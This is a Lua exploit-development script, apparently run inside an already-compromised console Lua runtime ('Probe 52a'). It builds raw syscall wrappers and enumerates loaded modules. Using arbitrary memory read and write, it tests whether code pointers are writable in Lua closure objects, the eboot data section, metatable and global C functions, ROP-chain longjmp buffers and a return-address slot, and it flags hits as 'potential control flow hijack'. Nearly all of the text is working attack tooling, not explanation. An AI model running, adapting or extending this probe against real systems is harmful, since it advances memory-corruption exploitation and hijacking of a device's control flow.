-- CRASH_CLASS: MODERATE
-- PROBE 52a: Loader Internals — Native Code Dispatch & Writable Code Pointers
--
-- Context: Probe 45c proved make_syscall() bypasses the ROP chain via a C wrapper.
-- Probe 47b found CClosure+0 is a "C function candidate" but NEVER TESTED if +0
-- is writable. The module-matching was buggy (heap addrs 0x3_1XXX matched as
-- mod0.text). This probe:
--   A) Maps all dynlib data sections (RW) for function pointer scanning
--   B) Properly tests CClosure +0 writability (the actual GCObject.next pointer)
--   C) Finds the REAL C function that implements __call dispatch
--   D) Scans eboot .data/.bss for writable pointers into .text (vtables, callbacks)
--   E) Scans the Lua state and registry for writable code pointers
--   F) Looks for the C-level syscall dispatch table in the loader

print("=== PROBE 52a: LOADER INTERNALS ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(v)
    local h, l = get_hi_lo(v)
    return string.format("%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
    if hex then return uint64("0x" .. hex), hex end
    return nil, nil
end

local sc_getpid = make_syscall(20)
local sc_info = make_syscall(593)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) MAP ALL MODULE SECTIONS (text=RX/XO, data=RW)
--------------------------------------------------------------------
print("")
print("=== A: MODULE MAP ===")
local modules = {}
for handle = 0, 50 do
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local ok, rv = pcall(function() return sc_info(uint64(handle), uint64(info)) end)
    if ok and to_num(rv) == 0 then
        local text_lo = safe_rd(info + 0x108) or 0
        local text_hi = safe_rd(info + 0x10C) or 0
        local text_sz_lo = safe_rd(info + 0x110) or 0
        local text_sz_hi = safe_rd(info + 0x114) or 0
        local data_lo = safe_rd(info + 0x148) or 0
        local data_hi = safe_rd(info + 0x14C) or 0
        local data_sz_lo = safe_rd(info + 0x150) or 0
        local data_sz_hi = safe_rd(info + 0x154) or 0
        -- Read module name (1 byte at a time from offset 0x18)
        local name = ""
        for i = 0, 31 do
            local b = safe_rd(info + 0x18 + i)
            if b and b > 0 and b < 128 then name = name .. string.char(b)
            else break end
        end
        if text_hi > 0 or text_lo > 0 then
            local m = {
                handle = handle, name = name,
                text_hi = text_hi, text_lo = text_lo,
                text_sz = text_sz_lo, text_sz_hi = text_sz_hi,
                data_hi = data_hi, data_lo = data_lo,
                data_sz = data_sz_lo, data_sz_hi = data_sz_hi,
            }
            table.insert(modules, m)
            print(string.format("  [%2d] %-20s text=%08X_%08X+%08X  data=%08X_%08X+%08X",
                handle, name, text_hi, text_lo, text_sz_lo, data_hi, data_lo, data_sz_lo))
        end
    end
end
print("  Total modules: " .. #modules)

-- Proper module lookup
local function in_text(h, l)
    for _, m in ipairs(modules) do
        if h == m.text_hi and l >= m.text_lo and l < (m.text_lo + m.text_sz) then
            return m, l - m.text_lo
        end
    end
    return nil
end
local function in_data(h, l)
    for _, m in ipairs(modules) do
        if m.data_sz > 0 and h == m.data_hi and l >= m.data_lo and l < (m.data_lo + m.data_sz) then
            return m, l - m.data_lo
        end
    end
    return nil
end

--------------------------------------------------------------------
-- B) CCLOSURE +0 WRITE TEST (never tested in 47b!)
--------------------------------------------------------------------
print("")
print("=== B: CCLOSURE +0 WRITE TEST ===")
local mt = getmetatable(syscall.pipe)
local call_fn = mt.__call
local fn_obj, fn_hex = parse_func_addr(call_fn)
if not fn_obj then
    print("FATAL: cannot parse __call address")
else
    print("__call CClosure at: 0x" .. fn_hex)
    -- Dump first 8 qwords
    for off = 0, 56, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            local m_t, moff_t = in_text(h, l)
            local m_d, moff_d = in_data(h, l)
            if m_t then note = string.format(" [%s.text+0x%X]", m_t.name, moff_t) end
            if m_d then note = string.format(" [%s.data+0x%X]", m_d.name, moff_d) end
            print(string.format("  +%02d: %s%s", off, fmt(val), note))
        end
    end

    -- Now test writability of EVERY offset 0..56
    print("")
    print("  Writability test (all offsets 0..56):")
    local probe_val = uint64("0xDEADC0DEDEADC0DE")
    for off = 0, 56, 8 do
        local saved = safe_rq(fn_obj + off)
        if saved then
            local wrote = safe_wq(fn_obj + off, probe_val)
            local rb = safe_rq(fn_obj + off)
            safe_wq(fn_obj + off, saved) -- restore immediately
            local rb_h, rb_l = get_hi_lo(rb)
            local writable = (rb_h == 0xDEADC0DE and rb_l == 0xDEADC0DE)
            local tag = writable and "WRITABLE" or "read-only"
            print(string.format("    +%02d: %s (%s)", off, tag, fmt(saved)))
        else
            print(string.format("    +%02d: unreadable", off))
        end
    end
end

--------------------------------------------------------------------
-- C) FIND THE REAL C DISPATCH FUNCTION
-- The CClosure f pointer (Lua 5.1 layout: offset +32 on x64) points
-- to the C function. But 47b showed +32 = heap addr. Either:
--   1) The struct layout is different (non-standard Lua)
--   2) The C function IS at a heap addr (JIT or loader-generated)
-- Let's read bytes at each qword that looks like a code pointer.
--------------------------------------------------------------------
print("")
print("=== C: C FUNCTION DISPATCH SEARCH ===")
if fn_obj then
    -- Read every qword in CClosure and try to read code bytes
    for off = 0, 56, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            -- Skip nullish and obvious data values
            if h == 0 and l == 0 then
                -- skip
            elseif h == 0 and l < 0x10000 then
                -- skip small values (flags, tags)
            else
                -- Try reading 16 bytes as code
                local bytes = {}
                local readable = true
                for i = 0, 15 do
                    local ok_b, b = pcall(function()
                        return memory.read_byte(val + i)
                    end)
                    if ok_b then
                        bytes[#bytes+1] = string.format("%02x", to_num(b))
                    else
                        readable = false
                        break
                    end
                end
                if readable and #bytes == 16 then
                    local hex_str = table.concat(bytes, " ")
                    -- Check for x86-64 function prologue patterns
                    local is_push_rbp = (bytes[1] == "55") -- push rbp
                    local is_sub_rsp = (bytes[1] == "48" and bytes[2] == "83" and bytes[3] == "ec") -- sub rsp, imm8
                    local is_mov_rbp = (bytes[1] == "48" and bytes[2] == "89" and bytes[3] == "e5") -- mov rbp, rsp
                    local is_push = bytes[1]:match("5[0-7]") -- push r64
                    local is_endbr64 = (bytes[1] == "f3" and bytes[2] == "0f" and bytes[3] == "1e" and bytes[4] == "fa")
                    local tag = ""
                    if is_push_rbp then tag = " *** FUNCTION PROLOGUE (push rbp) ***" end
                    if is_sub_rsp then tag = " *** FUNCTION PROLOGUE (sub rsp) ***" end
                    if is_endbr64 then tag = " *** FUNCTION PROLOGUE (endbr64) ***" end
                    if is_mov_rbp then tag = " *** FUNCTION PROLOGUE (mov rbp,rsp) ***" end
                    print(string.format("  +%02d → %s: %s%s", off, fmt(val), hex_str, tag))
                else
                    -- Could be XO or unmapped
                    local partial = #bytes > 0 and table.concat(bytes, " ") or "unreadable"
                    print(string.format("  +%02d → %s: [%d bytes] %s", off, fmt(val), #bytes, partial))
                end
            end
        end
    end

    -- Also check: does the CClosure point to ANOTHER struct that has the C func?
    -- In some Lua implementations, CClosure+32 → upvalue which → C func
    print("")
    print("  Dereferencing pointers for indirect dispatch:")
    for off = 0, 48, 8 do
        local ptr = safe_rq(fn_obj + off)
        if ptr then
            local ph, pl = get_hi_lo(ptr)
            -- Only follow heap-range pointers
            if ph >= 1 and ph <= 0x10 then
                -- Read 8 bytes at *ptr
                local inner = safe_rq(ptr)
                if inner then
                    local ih, il = get_hi_lo(inner)
                    local m_t, moff = in_text(ih, il)
                    if m_t then
                        print(string.format("    +%02d → *(%s) = %s [%s.text+0x%X] *** CODE PTR ***",
                            off, fmt(ptr), fmt(inner), m_t.name, moff))
                        -- Try reading code bytes
                        local cbytes = {}
                        for i = 0, 7 do
                            local ok_b, b = pcall(function() return memory.read_byte(inner + i) end)
                            if ok_b then cbytes[#cbytes+1] = string.format("%02x", to_num(b))
                            else break end
                        end
                        if #cbytes > 0 then
                            print(string.format("      code: %s", table.concat(cbytes, " ")))
                        end
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- D) EBOOT DATA SECTION SCAN FOR WRITABLE FUNCTION POINTERS
-- The eboot (handle 0) has data sections that may contain vtables,
-- callback arrays, or dispatch tables with pointers into .text.
--------------------------------------------------------------------
print("")
print("=== D: EBOOT DATA SECTION SCAN ===")
local eboot = modules[1] -- handle 0 is usually first
if eboot and eboot.data_sz > 0 then
    local data_base = uint64(string.format("0x%X%08X", eboot.data_hi, eboot.data_lo))
    local scan_size = eboot.data_sz
    if scan_size > 0x40000 then scan_size = 0x40000 end -- cap at 256KB
    print(string.format("  Scanning %s data at %s, size 0x%X (capped at 0x%X)",
        eboot.name, fmt(data_base), eboot.data_sz, scan_size))

    local found_ptrs = 0
    local writable_ptrs = 0
    local MAX_REPORT = 30

    for off = 0, scan_size - 8, 8 do
        local val = safe_rq(data_base + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t and m_t.handle == 0 then -- eboot .text pointer
                found_ptrs = found_ptrs + 1
                if found_ptrs <= MAX_REPORT then
                    -- Test writability
                    local saved = val
                    local wrote = safe_wq(data_base + off, probe_val)
                    local rb = safe_rq(data_base + off)
                    safe_wq(data_base + off, saved)
                    local rb_h = get_hi_lo(rb)
                    local writable = (rb_h == 0xDEADC0DE)
                    if writable then writable_ptrs = writable_ptrs + 1 end
                    local tag = writable and " *** WRITABLE ***" or ""
                    print(string.format("    data+0x%05X: %s → .text+0x%X%s",
                        off, fmt(val), moff, tag))
                end
            end
        end
        -- Yield periodically to avoid timeout
        if off % 0x10000 == 0 and off > 0 then
            print(string.format("    ... scanned 0x%X / 0x%X (%d ptrs found, %d writable)",
                off, scan_size, found_ptrs, writable_ptrs))
        end
    end
    print(string.format("  TOTAL: %d code pointers in eboot data, %d WRITABLE",
        found_ptrs, writable_ptrs))
else
    print("  No eboot data section found or size=0")
    -- Try all modules
    for _, m in ipairs(modules) do
        if m.data_sz > 0 then
            print(string.format("  [%d] %s has data section: %08X_%08X+0x%X",
                m.handle, m.name, m.data_hi, m.data_lo, m.data_sz))
        end
    end
end

--------------------------------------------------------------------
-- E) SCAN AROUND pipe OBJECT FOR DISPATCH TABLE
-- The make_syscall C wrapper must have a dispatch path. Look in the
-- neighborhood of the pipe object for function pointers.
--------------------------------------------------------------------
print("")
print("=== E: PIPE OBJECT NEIGHBORHOOD ===")
local pipe_str = tostring(syscall.pipe)
local pipe_addr_hex = pipe_str:match("address @ (0x[0-9a-fA-F]+)")
local fn_addr_str = pipe_str:match("fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if pipe_addr_hex then
    local pipe_addr = uint64(pipe_addr_hex)
    print("pipe object: " .. pipe_addr_hex)

    -- Scan the pipe object's wider neighborhood (-256 to +512)
    -- looking for code pointers that might be the dispatch function
    local code_ptrs_found = 0
    for off = -256, 512, 8 do
        local val = safe_rq(pipe_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t then
                code_ptrs_found = code_ptrs_found + 1
                if code_ptrs_found <= 20 then
                    -- Check if writable
                    local saved = val
                    safe_wq(pipe_addr + off, uint64("0xDEADC0DEDEADC0DE"))
                    local rb = safe_rq(pipe_addr + off)
                    safe_wq(pipe_addr + off, saved)
                    local rb_h = get_hi_lo(rb)
                    local writable = (rb_h == 0xDEADC0DE)
                    local tag = writable and " WRITABLE" or ""
                    print(string.format("  pipe%+04d: %s [%s.text+0x%X]%s",
                        off, fmt(val), m_t.name, moff, tag))
                end
            end
        end
    end
    print(string.format("  Code pointers near pipe: %d", code_ptrs_found))
end

--------------------------------------------------------------------
-- F) SCAN fn_addr STRUCTURE FOR THE REAL C WRAPPER
-- The fn_addr area has a structure around it. Look for the actual
-- dispatch function address.
--------------------------------------------------------------------
print("")
print("=== F: FN_ADDR STRUCTURE ===")
if fn_addr_str then
    local fn_addr = uint64(fn_addr_str)
    print("fn_addr ptr: " .. fn_addr_str)
    local fn_val = safe_rq(fn_addr)
    print("fn_addr value: " .. (fn_val and fmt(fn_val) or "nil"))

    -- Scan wider area around fn_addr for the dispatch mechanism
    -- The C wrapper must be somewhere nearby
    print("")
    print("  Wider neighborhood (-128 to +256):")
    for off = -128, 256, 8 do
        local val = safe_rq(fn_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            local m_t, moff = in_text(h, l)
            if m_t then
                -- Check writability
                local saved = val
                safe_wq(fn_addr + off, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fn_addr + off)
                safe_wq(fn_addr + off, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                local tag = writable and " WRITABLE" or ""
                print(string.format("    fn%+04d: %s [%s.text+0x%X]%s",
                    off, fmt(val), m_t.name, moff, tag))
            end
        end
    end
end

--------------------------------------------------------------------
-- G) METATABLE FUNCTIONS: TEST +0 WRITABILITY ON ALL
-- 47b only tested +32. The actual C function pointer in this
-- custom Lua may be at a different offset. Test +0 on all.
--------------------------------------------------------------------
print("")
print("=== G: ALL METATABLE CCLOSURES +0 WRITE TEST ===")
local mt_keys = {"__call", "__tostring", "__index", "__newindex", "__gc",
                 "arg_addr", "chain", "create_initial_chain", "new",
                 "__len", "__eq", "__add", "__sub", "__mul", "__div"}
for _, key in ipairs(mt_keys) do
    local ok_v, val = pcall(function() return mt[key] end)
    if ok_v and val ~= nil and type(val) == "function" then
        local fobj, fhex = parse_func_addr(val)
        if fobj then
            local val0 = safe_rq(fobj)
            if val0 then
                local saved = val0
                safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fobj)
                safe_wq(fobj, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                local tag = writable and " *** +0 WRITABLE ***" or ""
                print(string.format("  mt.%-20s obj=0x%s +0=%s%s", key, fhex, fmt(val0), tag))
            end
        end
    end
end

--------------------------------------------------------------------
-- H) GLOBAL FUNCTION TABLE SCAN
-- Scan _G for all C functions and test their CClosure +0 writability
--------------------------------------------------------------------
print("")
print("=== H: GLOBAL C FUNCTION SCAN (sample) ===")
local g_count = 0
local g_writable = 0
for key, val in pairs(_G) do
    if type(val) == "function" then
        local fobj, fhex = parse_func_addr(val)
        if fobj then
            local val0 = safe_rq(fobj)
            if val0 then
                local saved = val0
                safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                local rb = safe_rq(fobj)
                safe_wq(fobj, saved)
                local rb_h = get_hi_lo(rb)
                local writable = (rb_h == 0xDEADC0DE)
                g_count = g_count + 1
                if writable then
                    g_writable = g_writable + 1
                    if g_writable <= 10 then
                        print(string.format("  %-20s obj=0x%s +0=%s WRITABLE", key, fhex, fmt(val0)))
                    end
                end
            end
        end
    end
    -- Also scan tables (like string, math, etc)
    if type(val) == "table" and key ~= "_G" then
        for k2, v2 in pairs(val) do
            if type(v2) == "function" then
                local fobj, fhex = parse_func_addr(v2)
                if fobj then
                    local val0 = safe_rq(fobj)
                    if val0 then
                        local saved = val0
                        safe_wq(fobj, uint64("0xDEADC0DEDEADC0DE"))
                        local rb = safe_rq(fobj)
                        safe_wq(fobj, saved)
                        local rb_h = get_hi_lo(rb)
                        local writable = (rb_h == 0xDEADC0DE)
                        g_count = g_count + 1
                        if writable then
                            g_writable = g_writable + 1
                            if g_writable <= 10 then
                                print(string.format("  %s.%-15s obj=0x%s +0=%s WRITABLE",
                                    key, k2, fhex, fmt(val0)))
                            end
                        end
                    end
                end
            end
        end
    end
end
print(string.format("  Scanned %d C functions, %d with writable +0", g_count, g_writable))

--------------------------------------------------------------------
-- I) LONGJMP BUFFER SCAN
-- The ROP chain uses longjmp. If we can find the jmpbuf on the heap,
-- we can redirect control flow via setjmp/longjmp hijack.
--------------------------------------------------------------------
print("")
print("=== I: LONGJMP / RETURN PATH ===")
if rop_str then
    local rop_addr = uint64(rop_str)
    -- From 47b, the chain ends with longjmp gadget. Scan for jmpbuf addr.
    -- Pattern: pop rdi; <jmpbuf_addr>; ... ; call longjmp
    -- The chain at offset 0x2E0+ has the longjmp sequence
    for off = 0x260, 0x3E0, 8 do
        local val = safe_rq(rop_addr + off)
        if val then
            local h, l = get_hi_lo(val)
            -- Look for heap addresses that could be jmpbuf
            if h >= 1 and h <= 0x10 then
                -- Check if this heap addr contains something that looks like a saved RIP
                local inner = safe_rq(val)
                if inner then
                    local ih, il = get_hi_lo(inner)
                    local m_t, moff = in_text(ih, il)
                    local note = m_t and string.format(" [%s.text+0x%X]", m_t.name, moff) or ""
                    print(string.format("  chain+0x%03X: %s → *=%s%s",
                        off, fmt(val), fmt(inner), note))
                end
            end
        end
    end

    -- The return_addr slot
    local ret_addr_str = pipe_str:match("return_addr: (0x[0-9a-fA-F]+)")
    if ret_addr_str then
        local ret_addr = uint64(ret_addr_str)
        local ret_val = safe_rq(ret_addr)
        print("")
        print("  return_addr ptr: " .. ret_addr_str)
        print("  return_addr value: " .. (ret_val and fmt(ret_val) or "nil"))
        if ret_val then
            local rh, rl = get_hi_lo(ret_val)
            local m_t, moff = in_text(rh, rl)
            if m_t then
                print(string.format("  → [%s.text+0x%X]", m_t.name, moff))
            end
            -- Test writability
            local saved = ret_val
            safe_wq(ret_addr, uint64("0xDEADC0DEDEADC0DE"))
            local rb = safe_rq(ret_addr)
            safe_wq(ret_addr, saved)
            local rb_h = get_hi_lo(rb)
            local writable = (rb_h == 0xDEADC0DE)
            print("  return_addr writable: " .. tostring(writable))
            if writable then
                print("  *** return_addr IS WRITABLE — potential control flow hijack ***")
            end
        end
    end
end

--------------------------------------------------------------------
-- J) SUMMARY
--------------------------------------------------------------------
print("")
print("=== J: SUMMARY ===")
print("pid: " .. pid)
print("modules: " .. #modules)
print("")
print("=== PROBE 52a COMPLETE ===")
